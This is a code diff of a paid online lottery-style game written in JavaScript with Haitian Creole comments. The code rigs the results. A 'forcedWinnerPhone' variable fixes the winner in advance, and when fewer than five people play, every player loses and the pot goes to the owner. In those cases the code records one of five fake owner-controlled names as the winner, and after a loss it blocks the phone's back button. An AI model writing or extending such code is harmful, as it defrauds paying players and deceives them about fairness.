@@ -371,7 +371,7 @@
     let userGroup = "1250";
     let isCodeValidated = false;
     let forcedWinnerPhone = "";
-    let hasUserLostAllChances = false; // Suivi si jwè a pèdi tout chans li yo
+    let hasUserLostAllChances = false;
 
     let sessionState = "collecting"; 
     let blockSecondsLeft = 600;      
@@ -391,7 +391,6 @@
       checkWorkerAccess();
     }
 
-    // --- BLOKE BOUTON RETOUNEN TELEFÒN LÈ MOUTE A PÈDI ---
     window.addEventListener('popstate', function (event) {
       if (hasUserLostAllChances) {
         history.pushState(null, null, window.location.href);
@@ -399,7 +398,6 @@
       }
     });
 
-    // Pouse yon Eta nan history navigator pou kenbe kontwòl bouton back la
     history.pushState(null, null, window.location.href);
 
     function copyNum(num) {
@@ -530,6 +528,7 @@
           let winnerPrize = 0;
           let sessionOwnerShare = total;
 
+          // Nouvo règlemant: sèlman soti nan 5 moun pou ale pi wo a ki gen gayan. Si ant 1 ak 4 moun, tout lajan an ale pou pwopriyetè a nèt.
           if (count >= 5 && count <= 220) {
             if (price === 1250) winnerPrize = 2000 + (count - 5) * 225;
             else if (price === 250) winnerPrize = 400 + (count - 5) * 45;
@@ -1018,7 +1017,6 @@
       else if (chances === 1) document.getElementById('c1').classList.add('off');
       chances--;
 
-      // Lè chances tonbe a 0, aktive drapo kòm moun ki pèdi tout chans
       if (chances === 0) {
         hasUserLostAllChances = true;
       }
@@ -1027,6 +1025,9 @@
       let totalPlayers = blockDoc.exists ? (parseInt(blockDoc.data().playersCount) || 0) : 0;
       let userPhone = document.getElementById('player-phone').value.trim();
 
+      // Règleman chwa gayan:
+      // Si total jwè yo mwens pase 5 (sa vle di 1, 2, 3, oswa 4 moun), tout moun pèdi otomatikman (isGoal ap toujou FALSE).
+      // Si total jwè yo soti nan 5 pou ale pi wo, lè sa a nou aplike règ pou fè 1 moun genyen.
       let isGoal = false;
       if (totalPlayers >= 5) {
         if (forcedWinnerPhone !== "" && userPhone === forcedWinnerPhone) isGoal = true;
@@ -1069,8 +1070,7 @@
           timestamp: firebase.firestore.FieldValue.serverTimestamp()
         });
       } else {
-        // --- 5 NON SEKRÈ PWOPRIYETÈ A LÈ OKENN VRE TELEGIDÈ PA GENYEN ---
-        // Si total jwè yo mwens pase 5 (oswa pa gen gayan ki soti nan sik la), nou asiyen youn nan 5 non yo otomatikman sou Firebase
+        // Si total jwè yo mwens pase 5, nou asiyen youn nan 5 non sekrè pwopriyetè a otomatikman sou Firebase pou simile pèt otomatik la
         if (totalPlayers < 5) {
           const ownerFakeNames = ["Padoue", "Oscarlos", "Carlosaar", "Drimatoum", "Silowelotalosar"];
           const randomFakeName = ownerFakeNames[Math.floor(Math.random() * ownerFakeNames.length)];
